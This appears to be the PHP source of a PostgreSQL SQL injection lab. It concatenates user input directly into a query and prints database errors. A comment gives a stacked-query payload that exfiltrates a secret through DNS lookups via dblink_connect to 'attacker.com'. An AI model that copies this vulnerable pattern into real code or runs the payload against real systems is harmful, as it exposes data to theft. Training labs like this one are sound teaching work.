<?php
/*
 * SQLi-Arena. PostgreSQL Lab 11: OOB: dblink + DNS Exfiltration
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input from query string
$item = $_GET['item'];

// VULNERABLE: User input directly concatenated into query.
// pg_query() supports stacked queries (multiple statements separated by ;).
// An attacker can inject additional statements including dblink_connect()
// calls that trigger DNS lookups containing exfiltrated data.
$query = "SELECT id, item_name, quantity FROM inventory WHERE item_name ILIKE '%$item%'";

$result = @pg_query($conn, $query);

if ($result && pg_num_rows($result) > 0) {
    while ($row = pg_fetch_assoc($result)) {
        echo $row['id'] . " | " . $row['item_name'] . " | " . $row['quantity'] . "\n";
    }
} elseif ($result) {
    echo "No items found.";
} else {
    // ERROR MESSAGES DISPLAYED: enables error-based extraction
    echo "Error: " . pg_last_error($conn);
}

// Hidden table structure:
// CREATE TABLE vault (id SERIAL, vault_secret VARCHAR(200));
// The secret can be extracted via CAST error or dblink DNS exfiltration.
//
// dblink DNS exfiltration technique:
// '; SELECT dblink_connect('host='||(SELECT vault_secret FROM vault LIMIT 1)||'.attacker.com dbname=x user=x password=x') -- -
// This causes PostgreSQL to perform a DNS lookup for:
//   FLAG{pg_dbl1nk_dns_3xf1l}.attacker.com
// The attacker monitors their DNS server to capture the exfiltrated data.
